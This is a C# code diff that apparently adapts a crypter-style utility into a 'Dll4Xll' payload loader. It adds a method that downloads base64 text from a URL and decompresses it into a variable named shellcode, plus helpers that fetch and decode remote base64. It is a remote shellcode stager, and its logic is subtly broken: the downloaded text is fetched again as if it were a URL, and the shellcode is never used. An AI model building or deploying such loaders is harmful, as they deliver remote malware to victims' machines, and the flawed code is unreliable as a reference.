@@ -1,9 +1,10 @@
 ﻿using System;
 using System.IO;
 using System.IO.Compression;
+using System.Net;
 using System.Text;
 
-namespace SkavenCrypt
+namespace Dll4Xll
 {
     public class SkavenCode
     {
@@ -43,6 +44,28 @@ namespace SkavenCrypt
             }
         }
 
+        public static void DecodeAndDecompressUrl(string url)
+        {
+            byte[] shellcode;
+            using (WebClient client = new WebClient())
+            {
+                string encodedShellcode = client.DownloadString(url);
+                byte[] decodedBytes = SkavenCode.DecodeFromBase64Url(encodedShellcode);
+                using (MemoryStream inputStream = new MemoryStream(decodedBytes))
+                using (MemoryStream outputStream = new MemoryStream())
+                using (GZipStream decompressionStream = new GZipStream(inputStream, CompressionMode.Decompress))
+                {
+                    byte[] buffer = new byte[1024 * 4];
+                    int read;
+                    while ((read = decompressionStream.Read(buffer, 0, buffer.Length)) > 0)
+                    {
+                        outputStream.Write(buffer, 0, read);
+                    }
+                    shellcode = outputStream.ToArray();
+                }
+            }
+        }
+
         public static byte[] Compress(byte[] inputBytes)
         {
             using (MemoryStream ms = new MemoryStream())
@@ -70,14 +93,29 @@ namespace SkavenCrypt
             }
         }
 
-        public static string EncodeToBase64(byte[] inputBytes)
+        public static void EncodeToBase64(string inputFile, string outputFile)
         {
-            return Convert.ToBase64String(inputBytes);
+            byte[] inputBytes = File.ReadAllBytes(inputFile);
+            string base64Encoded = Convert.ToBase64String(inputBytes);
+            File.WriteAllText(outputFile, base64Encoded);
         }
 
-        public static byte[] DecodeFromBase64(string base64String)
+
+        public static void DecodeFromBase64(string inputFile, string outputFile)
         {
-            return Convert.FromBase64String(base64String);
+            string base64String = File.ReadAllText(inputFile);
+            byte[] decodedBytes = Convert.FromBase64String(base64String);
+            File.WriteAllBytes(outputFile, decodedBytes);
+        }
+
+        public static byte[] DecodeFromBase64Url(string url)
+        {
+            using (WebClient client = new WebClient())
+            {
+                string base64String = client.DownloadString(url);
+                byte[] inputBytes = Convert.FromBase64String(base64String);
+                return inputBytes;
+            }
         }
 
     }
